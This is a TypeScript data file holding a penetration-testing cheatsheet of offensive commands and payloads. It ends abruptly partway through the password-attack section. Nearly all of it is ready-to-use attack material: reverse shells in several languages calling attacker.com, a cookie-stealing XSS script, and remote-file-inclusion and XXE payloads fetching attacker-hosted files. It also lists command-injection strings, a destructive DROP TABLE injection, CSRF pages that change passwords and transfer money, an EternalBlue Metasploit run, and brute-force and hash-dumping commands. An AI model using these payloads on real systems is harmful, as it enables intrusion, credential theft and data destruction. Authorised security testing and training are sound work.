/* eslint-disable no-script-url */
export interface Command {
  command: string;
  description: string;
  category: string;
}

export interface Tool {
  name: string;
  description: string;
  commands: Command[];
  notes?: string;
}

export interface Payload {
  payload: string;
  description: string;
  context: string;
}

export interface ManualExploit {
  payload: string;
  description: string;
  context: string;
}

export interface ReverseShell {
  name: string;
  command: string;
  description: string;
}

export interface XSSType {
  type: string;
  payloads: Payload[];
}

export interface CSRFExploit {
  name: string;
  code: string;
  description: string;
}

export interface DeserializationExample {
  language: string;
  payload: string;
  description: string;
}

export interface Vulnerability {
  name: string;
  description: string;
  severity: string;
  tools?: Tool[];
  manualExploits?: ManualExploit[];
  payloads?: Payload[];
  reverseShells?: ReverseShell[];
  types?: XSSType[];
  exploits?: CSRFExploit[];
  examples?: DeserializationExample[];
  notes?: string;
}

export interface PrivEscMethod {
  name: string;
  commands: Command[];
}

export interface PrivEscTechnique {
  platform: string;
  methods: PrivEscMethod[];
  tools: Tool[];
}

export interface PersistenceMethod {
  name: string;
  commands: Command[];
}

export interface PersistenceTechnique {
  platform: string;
  methods: PersistenceMethod[];
}

export interface CoveringTracksTechnique {
  platform: string;
  commands: Command[];
}

export interface Resource {
  name: string;
  description: string;
  url?: string;
  commands?: Command[];
}

export interface WiresharkFilter {
  filter: string;
  description: string;
}

export interface TrafficTool {
  name: string;
  description: string;
  filters?: WiresharkFilter[];
  commands?: Command[];
}

export interface OWASPVulnerability {
  rank: number;
  name: string;
  description: string;
  severity: string;
  examples?: string[];
  types?: string[];
  testMethods?: string[];
  payloads?: Payload[];
  tools?: string[];
  covered?: string;
}

export interface Port {
  port: number;
  service: string;
  vulnerabilities: string[];
}

export interface Subsection {
  subtitle: string;
  description: string;
  tools?: Tool[];
  vulnerabilities?: Vulnerability[];
  techniques?: (PrivEscTechnique | PersistenceTechnique | CoveringTracksTechnique)[];
  resources?: Resource[];
}

export interface Section {
  title: string;
  description: string;
  subsections?: Subsection[];
  vulnerabilities?: OWASPVulnerability[];
  ports?: Port[];
}

export interface CheatsheetData {
  title: string;
  description: string;
  sections: Section[];
}

export const cheatsheetData: CheatsheetData = {
  title: "Penetration Testing Cheatsheet",
  description: "A comprehensive guide with commands, tools, and vulnerability scripts for penetration testing.",
  
  sections: [
    {
      title: "Phase 1: Reconnaissance (Information Gathering)",
      description: "Gather as much information as possible about the target system",
      
      subsections: [
        {
          subtitle: "Passive Reconnaissance",
          description: "Gathering information without directly interacting with the target",
          
          tools: [
            {
              name: "Google Dorking",
              description: "Advanced Google search operators for finding sensitive information",
              commands: [
                {
                  command: 'site:target.com filetype:pdf',
                  description: "Find all PDF files on target domain",
                  category: "search"
                },
                {
                  command: 'site:target.com inurl:admin',
                  description: "Find admin panels",
                  category: "search"
                },
                {
                  command: 'site:target.com intitle:"index of"',
                  description: "Find directory listings",
                  category: "search"
                },
                {
                  command: 'site:target.com ext:sql | ext:db | ext:dbf',
                  description: "Find database files",
                  category: "search"
                },
                {
                  command: 'site:target.com intext:"password" | intext:"username"',
                  description: "Find pages containing credentials",
                  category: "search"
                }
              ]
            },
            {
              name: "WHOIS Lookup",
              description: "Domain registration information gathering",
              commands: [
                {
                  command: 'whois target.com',
                  description: "Get domain registration details",
                  category: "reconnaissance"
                },
                {
                  command: 'whois -h whois.arin.net 192.168.1.1',
                  description: "IP WHOIS lookup",
                  category: "reconnaissance"
                }
              ]
            },
            {
              name: "theHarvester",
              description: "Email, subdomain, and name harvesting tool",
              commands: [
                {
                  command: 'theHarvester -d target.com -b google',
                  description: "Harvest emails using Google",
                  category: "reconnaissance"
                },
                {
                  command: 'theHarvester -d target.com -b all',
                  description: "Use all sources for harvesting",
                  category: "reconnaissance"
                },
                {
                  command: 'theHarvester -d target.com -b linkedin -l 500',
                  description: "Harvest from LinkedIn with 500 results limit",
                  category: "reconnaissance"
                }
              ]
            },
            {
              name: "Shodan",
              description: "Search engine for Internet-connected devices",
              commands: [
                {
                  command: 'shodan search "apache" country:US',
                  description: "Find Apache servers in the US",
                  category: "reconnaissance"
                },
                {
                  command: 'shodan host 192.168.1.1',
                  description: "Get detailed information about an IP",
                  category: "reconnaissance"
                },
                {
                  command: 'shodan search "default password" port:22',
                  description: "Find SSH servers with default passwords",
                  category: "reconnaissance"
                }
              ]
            },
            {
              name: "DNSRecon",
              description: "DNS enumeration and reconnaissance",
              commands: [
                {
                  command: 'dnsrecon -d target.com',
                  description: "Standard DNS enumeration",
                  category: "reconnaissance"
                },
                {
                  command: 'dnsrecon -d target.com -t axfr',
                  description: "Attempt DNS zone transfer",
                  category: "reconnaissance"
                },
                {
                  command: 'dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt',
                  description: "Subdomain brute forcing",
                  category: "reconnaissance"
                }
              ]
            },
            {
              name: "Sublist3r",
              description: "Subdomain enumeration tool",
              commands: [
                {
                  command: 'sublist3r -d target.com',
                  description: "Enumerate subdomains",
                  category: "reconnaissance"
                },
                {
                  command: 'sublist3r -d target.com -b',
                  description: "Enable subbrute for brute forcing",
                  category: "reconnaissance"
                },
                {
                  command: 'sublist3r -d target.com -p 80,443',
                  description: "Check specific ports on found subdomains",
                  category: "reconnaissance"
                }
              ]
            }
          ]
        },
        
        {
          subtitle: "Active Reconnaissance",
          description: "Direct interaction with the target system",
          
          tools: [
            {
              name: "Nmap",
              description: "Network discovery and security auditing",
              commands: [
                {
                  command: 'nmap -sn 192.168.1.0/24',
                  description: "Ping sweep (host discovery)",
                  category: "scanning"
                },
                {
                  command: 'nmap -sS -sV -O target.com',
                  description: "SYN scan with version detection and OS detection",
                  category: "scanning"
                },
                {
                  command: 'nmap -p- target.com',
                  description: "Scan all 65535 ports",
                  category: "scanning"
                },
                {
                  command: 'nmap -sC -sV -p 1-1000 target.com',
                  description: "Scan with default scripts and version detection",
                  category: "scanning"
                },
                {
                  command: 'nmap -sU -p 161 target.com',
                  description: "UDP scan for SNMP",
                  category: "scanning"
                },
                {
                  command: 'nmap --script vuln target.com',
                  description: "Run vulnerability scripts",
                  category: "scanning"
                },
                {
                  command: 'nmap -sV --script=http-enum target.com',
                  description: "Enumerate web directories and files",
                  category: "scanning"
                },
                {
                  command: 'nmap -A -T4 target.com',
                  description: "Aggressive scan with timing template",
                  category: "scanning"
                },
                {
                  command: 'nmap --script=ssl-enum-ciphers -p 443 target.com',
                  description: "Enumerate SSL/TLS ciphers",
                  category: "scanning"
                }
              ]
            },
            {
              name: "Masscan",
              description: "Fast port scanner",
              commands: [
                {
                  command: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
                  description: "Fast scan of all ports",
                  category: "scanning"
                },
                {
                  command: 'masscan -p80,443 0.0.0.0/0 --rate=10000',
                  description: "Scan entire internet for web servers",
                  category: "scanning"
                }
              ]
            },
            {
              name: "Netcat",
              description: "Network utility for reading/writing data across connections",
              commands: [
                {
                  command: 'nc -zv target.com 1-1000',
                  description: "Port scanning",
                  category: "scanning"
                },
                {
                  command: 'nc -lvp 4444',
                  description: "Listen on port 4444",
                  category: "exploitation"
                },
                {
                  command: 'nc target.com 80',
                  description: "Connect to HTTP server",
                  category: "scanning"
                },
                {
                  command: 'nc -e /bin/bash target.com 4444',
                  description: "Reverse shell (attacker listening)",
                  category: "exploitation"
                }
              ]
            }
          ]
        }
      ]
    },
    
    {
      title: "Phase 2: Scanning & Enumeration",
      description: "Identify live hosts, open ports, services, and potential vulnerabilities",
      
      subsections: [
        {
          subtitle: "Vulnerability Scanning",
          description: "Automated vulnerability detection",
          
          tools: [
            {
              name: "Nessus",
              description: "Comprehensive vulnerability scanner",
              notes: "Primarily GUI-based tool",
              commands: [
                {
                  command: '/opt/nessus/sbin/nessuscli scan new',
                  description: "Create new scan via CLI",
                  category: "scanning"
                },
                {
                  command: '/opt/nessus/sbin/nessuscli update --all',
                  description: "Update Nessus plugins",
                  category: "maintenance"
                }
              ]
            },
            {
              name: "OpenVAS",
              description: "Open-source vulnerability scanner",
              commands: [
                {
                  command: 'openvas-setup',
                  description: "Initial setup of OpenVAS",
                  category: "setup"
                },
                {
                  command: 'openvas-start',
                  description: "Start OpenVAS services",
                  category: "scanning"
                },
                {
                  command: 'openvas-feed-update',
                  description: "Update vulnerability feeds",
                  category: "maintenance"
                }
              ]
            },
            {
              name: "Nikto",
              description: "Web server scanner",
              commands: [
                {
                  command: 'nikto -h http://target.com',
                  description: "Basic web server scan",
                  category: "scanning"
                },
                {
                  command: 'nikto -h http://target.com -p 80,443,8080',
                  description: "Scan multiple ports",
                  category: "scanning"
                },
                {
                  command: 'nikto -h http://target.com -Tuning 123bde',
                  description: "Custom tuning (skip certain tests)",
                  category: "scanning"
                },
                {
                  command: 'nikto -h http://target.com -o report.html -Format html',
                  description: "Save report in HTML format",
                  category: "scanning"
                },
                {
                  command: 'nikto -h http://target.com -useproxy http://proxy:8080',
                  description: "Scan through proxy",
                  category: "scanning"
                }
              ]
            }
          ]
        },
        
        {
          subtitle: "Service Enumeration",
          description: "Detailed service and version information gathering",
          
          tools: [
            {
              name: "Enum4linux",
              description: "Windows/Samba enumeration tool",
              commands: [
                {
                  command: 'enum4linux -a target.com',
                  description: "Do all simple enumeration",
                  category: "enumeration"
                },
                {
                  command: 'enum4linux -U target.com',
                  description: "Enumerate users",
                  category: "enumeration"
                },
                {
                  command: 'enum4linux -S target.com',
                  description: "Enumerate shares",
                  category: "enumeration"
                },
                {
                  command: 'enum4linux -G target.com',
                  description: "Enumerate groups",
                  category: "enumeration"
                }
              ]
            },
            {
              name: "SMBClient",
              description: "SMB/CIFS client",
              commands: [
                {
                  command: 'smbclient -L //target.com -N',
                  description: "List shares without password",
                  category: "enumeration"
                },
                {
                  command: 'smbclient //target.com/share -U username',
                  description: "Connect to specific share",
                  category: "enumeration"
                },
                {
                  command: 'smbclient //target.com/C$ -U administrator',
                  description: "Access C drive share",
                  category: "enumeration"
                }
              ]
            },
            {
              name: "SNMPwalk",
              description: "SNMP enumeration",
              commands: [
                {
                  command: 'snmpwalk -c public -v1 target.com',
                  description: "Walk SNMP tree with public community",
                  category: "enumeration"
                },
                {
                  command: 'snmpwalk -c public -v2c target.com',
                  description: "SNMP v2c enumeration",
                  category: "enumeration"
                },
                {
                  command: 'snmpwalk -c public -v1 target.com 1.3.6.1.4.1.77.1.2.25',
                  description: "Enumerate users via SNMP",
                  category: "enumeration"
                }
              ]
            },
            {
              name: "Gobuster",
              description: "Directory and file brute forcing",
              commands: [
                {
                  command: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt',
                  description: "Directory brute forcing",
                  category: "enumeration"
                },
                {
                  command: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt',
                  description: "Brute force with file extensions",
                  category: "enumeration"
                },
                {
                  command: 'gobuster dns -d target.com -w subdomains.txt',
                  description: "DNS subdomain brute forcing",
                  category: "enumeration"
                },
                {
                  command: 'gobuster vhost -u http://target.com -w vhosts.txt',
                  description: "Virtual host brute forcing",
                  category: "enumeration"
                }
              ]
            },
            {
              name: "Dirbuster",
              description: "Web application directory scanner",
              commands: [
                {
                  command: 'dirb http://target.com',
                  description: "Basic directory scan",
                  category: "enumeration"
                },
                {
                  command: 'dirb http://target.com /usr/share/wordlists/dirb/big.txt',
                  description: "Scan with custom wordlist",
                  category: "enumeration"
                },
                {
                  command: 'dirb http://target.com -X .php,.txt,.html',
                  description: "Search for specific extensions",
                  category: "enumeration"
                }
              ]
            },
            {
              name: "WPScan",
              description: "WordPress vulnerability scanner",
              commands: [
                {
                  command: 'wpscan --url http://target.com',
                  description: "Basic WordPress scan",
                  category: "enumeration"
                },
                {
                  command: 'wpscan --url http://target.com --enumerate u',
                  description: "Enumerate users",
                  category: "enumeration"
                },
                {
                  command: 'wpscan --url http://target.com --enumerate p',
                  description: "Enumerate plugins",
                  category: "enumeration"
                },
                {
                  command: 'wpscan --url http://target.com --enumerate vp',
                  description: "Enumerate vulnerable plugins",
                  category: "enumeration"
                },
                {
                  command: 'wpscan --url http://target.com -U users.txt -P passwords.txt',
                  description: "Brute force attack",
                  category: "exploitation"
                }
              ]
            }
          ]
        }
      ]
    },
    
    {
      title: "Phase 3: Gaining Access (Exploitation)",
      description: "Exploit identified vulnerabilities to gain unauthorized access",
      
      subsections: [
        {
          subtitle: "Web Application Attacks",
          description: "Common web application vulnerability exploitation",
          
          vulnerabilities: [
            {
              name: "SQL Injection",
              description: "Inject malicious SQL commands",
              severity: "Critical",
              
              tools: [
                {
                  name: "SQLmap",
                  description: "Automated SQL injection tool",
                  commands: [
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1"',
                      description: "Basic SQL injection test",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" --dbs',
                      description: "Enumerate databases",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" -D database --tables',
                      description: "Enumerate tables in database",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns',
                      description: "Enumerate columns in table",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump',
                      description: "Dump table data",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" --os-shell',
                      description: "Get OS shell",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -r request.txt --batch',
                      description: "Use captured request file",
                      category: "exploitation"
                    },
                    {
                      command: 'sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3',
                      description: "Thorough testing (aggressive)",
                      category: "exploitation"
                    }
                  ]
                }
              ],
              
              manualExploits: [
                {
                  payload: "' OR '1'='1",
                  description: "Basic authentication bypass",
                  context: "Login forms"
                },
                {
                  payload: "' UNION SELECT NULL,NULL,NULL--",
                  description: "Determine number of columns",
                  context: "UNION-based injection"
                },
                {
                  payload: "' UNION SELECT username,password FROM users--",
                  description: "Extract data from users table",
                  context: "UNION-based injection"
                },
                {
                  payload: "admin'--",
                  description: "Comment out rest of query",
                  context: "Authentication bypass"
                },
                {
                  payload: "1' AND 1=1--",
                  description: "Boolean-based blind SQLi (true)",
                  context: "Blind SQL injection"
                },
                {
                  payload: "1' AND 1=2--",
                  description: "Boolean-based blind SQLi (false)",
                  context: "Blind SQL injection"
                },
                {
                  payload: "'; DROP TABLE users--",
                  description: "Destructive SQL injection",
                  context: "Database manipulation"
                },
                {
                  payload: "' OR SLEEP(5)--",
                  description: "Time-based blind SQLi",
                  context: "Blind SQL injection"
                }
              ]
            },
            
            {
              name: "Cross-Site Scripting (XSS)",
              description: "Inject malicious scripts into web pages",
              severity: "High",
              
              types: [
                {
                  type: "Reflected XSS",
                  payloads: [
                    {
                      payload: "<script>alert('XSS')</script>",
                      description: "Basic XSS test",
                      context: "URL parameters, search fields"
                    },
                    {
                      payload: "<img src=x onerror=alert('XSS')>",
                      description: "Image-based XSS",
                      context: "Input fields"
                    },
                    {
                      payload: "<svg/onload=alert('XSS')>",
                      description: "SVG-based XSS",
                      context: "Input fields"
                    },
                    {
                      payload: "javascript:alert('XSS')",
                      description: "JavaScript protocol",
                      context: "Link href attributes"
                    },
                    {
                      payload: "<iframe src=javascript:alert('XSS')>",
                      description: "IFrame-based XSS",
                      context: "Input fields"
                    }
                  ]
                },
                {
                  type: "Stored XSS",
                  payloads: [
                    {
                      payload: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                      description: "Cookie stealing",
                      context: "Comment sections, profile fields"
                    },
                    {
                      payload: "<script src=http://attacker.com/malicious.js></script>",
                      description: "External script inclusion",
                      context: "Persistent storage fields"
                    }
                  ]
                },
                {
                  type: "DOM-based XSS",
                  payloads: [
                    {
                      payload: "#<img src=x onerror=alert('XSS')>",
                      description: "Fragment-based DOM XSS",
                      context: "Hash/fragment manipulation"
                    }
                  ]
                }
              ],
              
              tools: [
                {
                  name: "XSStrike",
                  description: "Advanced XSS detection suite",
                  commands: [
                    {
                      command: 'xsstrike -u "http://target.com/page.php?q=test"',
                      description: "Scan for XSS vulnerabilities",
                      category: "exploitation"
                    },
                    {
                      command: 'xsstrike -u "http://target.com/page.php?q=test" --crawl',
                      description: "Crawl and scan for XSS",
                      category: "exploitation"
                    }
                  ]
                }
              ]
            },
            
            {
              name: "Command Injection",
              description: "Execute arbitrary commands on the server",
              severity: "Critical",
              
              payloads: [
                {
                  payload: "; ls -la",
                  description: "List directory contents (Linux)",
                  context: "Command chaining"
                },
                {
                  payload: "| whoami",
                  description: "Get current user",
                  context: "Pipe operator"
                },
                {
                  payload: "&& cat /etc/passwd",
                  description: "Read passwd file",
                  context: "AND operator"
                },
                {
                  payload: "; nc -e /bin/bash attacker.com 4444",
                  description: "Reverse shell",
                  context: "Netcat reverse shell"
                },
                {
                  payload: "`whoami`",
                  description: "Command substitution",
                  context: "Backticks"
                },
                {
                  payload: "$(id)",
                  description: "Command substitution",
                  context: "Dollar parentheses"
                },
                {
                  payload: "; ping -c 10 attacker.com",
                  description: "Time-based detection via ping",
                  context: "Blind command injection"
                }
              ],
              
              reverseShells: [
                {
                  name: "Bash Reverse Shell",
                  command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                  description: "Bash TCP reverse shell"
                },
                {
                  name: "Python Reverse Shell",
                  command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                  description: "Python TCP reverse shell"
                },
                {
                  name: "PHP Reverse Shell",
                  command: "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                  description: "PHP TCP reverse shell"
                },
                {
                  name: "Netcat Reverse Shell",
                  command: "nc -e /bin/sh attacker.com 4444",
                  description: "Netcat reverse shell"
                },
                {
                  name: "Perl Reverse Shell",
                  command: "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                  description: "Perl TCP reverse shell"
                },
                {
                  name: "Ruby Reverse Shell",
                  command: "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                  description: "Ruby TCP reverse shell"
                }
              ]
            },
            
            {
              name: "Local File Inclusion (LFI)",
              description: "Include local files from the server",
              severity: "High",
              
              payloads: [
                {
                  payload: "../../../../etc/passwd",
                  description: "Read passwd file (Linux)",
                  context: "Path traversal"
                },
                {
                  payload: "../../../../etc/shadow",
                  description: "Read shadow file (requires privileges)",
                  context: "Path traversal"
                },
                {
                  payload: "..\\..\\..\\..\\windows\\system32\\config\\sam",
                  description: "Read SAM file (Windows)",
                  context: "Windows path traversal"
                },
                {
                  payload: "php://filter/convert.base64-encode/resource=index.php",
                  description: "Read PHP source code (base64 encoded)",
                  context: "PHP wrapper"
                },
                {
                  payload: "php://input",
                  description: "Include POST data as PHP code",
                  context: "PHP wrapper exploitation"
                },
                {
                  payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                  description: "Execute PHP via data wrapper",
                  context: "Data wrapper"
                },
                {
                  payload: "expect://id",
                  description: "Execute commands via expect wrapper",
                  context: "Expect wrapper"
                },
                {
                  payload: "/proc/self/environ",
                  description: "Read environment variables",
                  context: "Linux proc filesystem"
                },
                {
                  payload: "/var/log/apache2/access.log",
                  description: "Log poisoning",
                  context: "Access log file"
                }
              ]
            },
            
            {
              name: "Remote File Inclusion (RFI)",
              description: "Include remote files from attacker's server",
              severity: "Critical",
              notes: "Requires allow_url_include=On in PHP configuration",
              
              payloads: [
                {
                  payload: "http://attacker.com/shell.txt",
                  description: "Include remote shell",
                  context: "Remote inclusion"
                },
                {
                  payload: "http://attacker.com/shell.txt?",
                  description: "Null byte bypass (old PHP versions)",
                  context: "Remote inclusion with null byte"
                },
                {
                  payload: "http://attacker.com/shell.txt%00",
                  description: "URL encoded null byte",
                  context: "Null byte bypass"
                }
              ]
            },
            
            {
              name: "XML External Entity (XXE)",
              description: "Exploit XML parsers to read files or perform SSRF",
              severity: "High",
              
              payloads: [
                {
                  payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                  description: "Read local file",
                  context: "XXE file disclosure"
                },
                {
                  payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>',
                  description: "SSRF via XXE",
                  context: "Internal network scanning"
                },
                {
                  payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                  description: "Base64 encoded file read",
                  context: "XXE with encoding"
                },
                {
                  payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
                  description: "Blind XXE with external DTD",
                  context: "Out-of-band XXE"
                }
              ]
            },
            
            {
              name: "Server-Side Request Forgery (SSRF)",
              description: "Force server to make requests to internal resources",
              severity: "High",
              
              payloads: [
                {
                  payload: "http://localhost:80",
                  description: "Access localhost services",
                  context: "Internal service access"
                },
                {
                  payload: "http://127.0.0.1:8080",
                  description: "Access internal application",
                  context: "Internal port scanning"
                },
                {
                  payload: "http://169.254.169.254/latest/meta-data/",
                  description: "AWS metadata service",
                  context: "Cloud metadata access"
                },
                {
                  payload: "http://192.168.0.1",
                  description: "Internal network scanning",
                  context: "Private IP access"
                },
                {
                  payload: "file:///etc/passwd",
                  description: "Local file access",
                  context: "File protocol"
                },
                {
                  payload: "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com",
                  description: "Gopher protocol exploitation",
                  context: "Protocol smuggling"
                }
              ]
            },
            
            {
              name: "Cross-Site Request Forgery (CSRF)",
              description: "Force authenticated users to perform unwanted actions",
              severity: "Medium",
              
              exploits: [
                {
                  name: "HTML Form CSRF",
                  code: `<html>
  <body>
    <form action="http://target.com/change-password" method="POST">
      <input type="hidden" name="password" value="hacked123" />
      <input type="hidden" name="confirm_password" value="hacked123" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>`,
                  description: "Auto-submitting form CSRF"
                },
                {
                  name: "Image Tag CSRF",
                  code: '<img src="http://target.com/delete-account?confirm=yes" />',
                  description: "GET request CSRF via image"
                },
                {
                  name: "JavaScript CSRF",
                  code: `<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/transfer-money", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("amount=1000&to=attacker");
</script>`,
                  description: "AJAX CSRF attack"
                }
              ]
            },
            
            {
              name: "Insecure Deserialization",
              description: "Exploit deserialization of untrusted data",
              severity: "Critical",
              
              tools: [
                {
                  name: "ysoserial",
                  description: "Java deserialization payload generator",
                  commands: [
                    {
                      command: 'java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64',
                      description: "Generate Java deserialization payload",
                      category: "exploitation"
                    },
                    {
                      command: 'java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash attacker.com 4444"',
                      description: "Reverse shell payload",
                      category: "exploitation"
                    }
                  ]
                }
              ],
              
              examples: [
                {
                  language: "PHP",
                  payload: 'O:8:"UserData":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}',
                  description: "PHP object injection"
                },
                {
                  language: "Python",
                  payload: "cos\\nsystem\\n(S'id'\\ntR.",
                  description: "Python pickle deserialization"
                }
              ]
            }
          ]
        },
        
        {
          subtitle: "Network Exploitation",
          description: "Network-level attacks and exploits",
          
          tools: [
            {
              name: "Metasploit Framework",
              description: "Comprehensive penetration testing framework",
              commands: [
                {
                  command: 'msfconsole',
                  description: "Start Metasploit console",
                  category: "exploitation"
                },
                {
                  command: 'search ms17-010',
                  description: "Search for EternalBlue exploit",
                  category: "exploitation"
                },
                {
                  command: 'use exploit/windows/smb/ms17_010_eternalblue',
                  description: "Use EternalBlue exploit module",
                  category: "exploitation"
                },
                {
                  command: 'set RHOSTS 192.168.1.100',
                  description: "Set target host",
                  category: "exploitation"
                },
                {
                  command: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
                  description: "Set payload",
                  category: "exploitation"
                },
                {
                  command: 'set LHOST 192.168.1.50',
                  description: "Set listening host",
                  category: "exploitation"
                },
                {
                  command: 'set LPORT 4444',
                  description: "Set listening port",
                  category: "exploitation"
                },
                {
                  command: 'exploit',
                  description: "Run the exploit",
                  category: "exploitation"
                },
                {
                  command: 'sessions -l',
                  description: "List active sessions",
                  category: "post-exploitation"
                },
                {
                  command: 'sessions -i 1',
                  description: "Interact with session",
                  category: "post-exploitation"
                },
                {
                  command: 'use auxiliary/scanner/smb/smb_version',
                  description: "SMB version scanner",
                  category: "scanning"
                },
                {
                  command: 'use auxiliary/scanner/ssh/ssh_login',
                  description: "SSH brute force module",
                  category: "exploitation"
                }
              ]
            },
            {
              name: "Responder",
              description: "LLMNR, NBT-NS and MDNS poisoner",
              commands: [
                {
                  command: 'responder -I eth0 -rdwv',
                  description: "Start Responder on eth0",
                  category: "exploitation"
                },
                {
                  command: 'responder -I eth0 -rdwv -F',
                  description: "Force WPAD authentication",
                  category: "exploitation"
                }
              ]
            },
            {
              name: "Impacket",
              description: "Collection of Python classes for network protocols",
              commands: [
                {
                  command: 'python3 psexec.py domain/user:password@target.com',
                  description: "PSExec-like functionality",
                  category: "exploitation"
                },
                {
                  command: 'python3 secretsdump.py domain/user:password@target.com',
                  description: "Dump password hashes",
                  category: "exploitation"
                },
                {
                  command: 'python3 smbexec.py domain/user:password@target.com',
                  description: "Execute commands via SMB",
                  category: "exploitation"
                },
                {
                  command: 'python3 wmiexec.py domain/user:password@target.com',
                  description: "Execute commands via WMI",
                  category: "exploitation"
                },
                {
                  command: 'python3 ntlmrelayx.py -tf targets.txt -smb2support',
                  description: "NTLM relay attack",
                  category: "exploitation"
                }
              ]
            }
          ]
        },
        
        {
          subtitle: "Password Attacks",
          description: "Password cracking and authentication attacks",
          
          tools: [
            {
              name: "John the Ripper",
              description: "Password cracking tool",
              commands: [
                {
                  command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
                  description: "Dictionary attack",
                  category: "password-cracking"
                },
                {
                  command: 'john --format=NT hashes.txt',
                  description: "Crack NTLM hashes",
                  category: "password-cracking"
                },
                {
                  command: 'john --show hashes.txt',
                  description: "Show cracked passwords",
                  category: "password-cracking"
                },
                {
                  command: 'john --incremental hashes.txt',
                  description: "Brute force mode",
                  category: "password-cracking"
                },
                {
                  command: 'unshadow passwd shadow > combined.txt',
                  description: "Combine passwd and shadow files",
                  category: "password-cracking"
                },
                {
                  command: 'john combined.txt',
                  description: "Crack combined file",
                  category: "password-cracking"
                }
              ]
            },
            {
              name: "Hashcat",
              description: "Advanced password recovery",
              commands: [
                {
                  command: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
                  description: "MD5 dictionary attack",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt',
                  description: "NTLM dictionary attack",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat -m 1800 -a 0 hashes.txt wordlist.txt',
                  description: "Linux SHA-512 attack",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l',
                  description: "Brute force 6 lowercase letters",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d?d',
                  description: "Mixed character brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule',
                  description: "Dictionary attack with rules",
                  category: "password-cracking"
                },
                {
                  command: 'hashcat --show hashes.txt',
                  description: "Show cracked passwords",
                  category: "password-cracking"
                }
              ]
            },
            {
              name: "Hydra",
              description: "Network login cracker",
              commands: [
                {
                  command: 'hydra -l admin -P passwords.txt ssh://target.com',
                  description: "SSH brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -L users.txt -P passwords.txt ftp://target.com',
                  description: "FTP brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"',
                  description: "HTTP POST form brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -L users.txt -P passwords.txt smb://target.com',
                  description: "SMB brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -l admin -P passwords.txt rdp://target.com',
                  description: "RDP brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -L users.txt -P passwords.txt mysql://target.com',
                  description: "MySQL brute force",
                  category: "password-cracking"
                },
                {
                  command: 'hydra -t 4 -l admin -P passwords.txt ssh://target.com',
                  description: "SSH brute force with 4 threads",
                  category: "password-cracking"
                }
              ]
            },
            {
              name: "Medusa",
              description: "Fast parallel password cracker",
              commands: [
                {
                  command: 'medusa -h target.com -u admin -P passwords.txt -M ssh',
                  description: "SSH brute force",
                  category: "password-cracking"
                },
                {
                  command: 'medusa -h target.com -U users.txt -P passwords.txt -M ftp',
                  description: "FTP brute force",
                  category: "password-cracking"
                },
                {
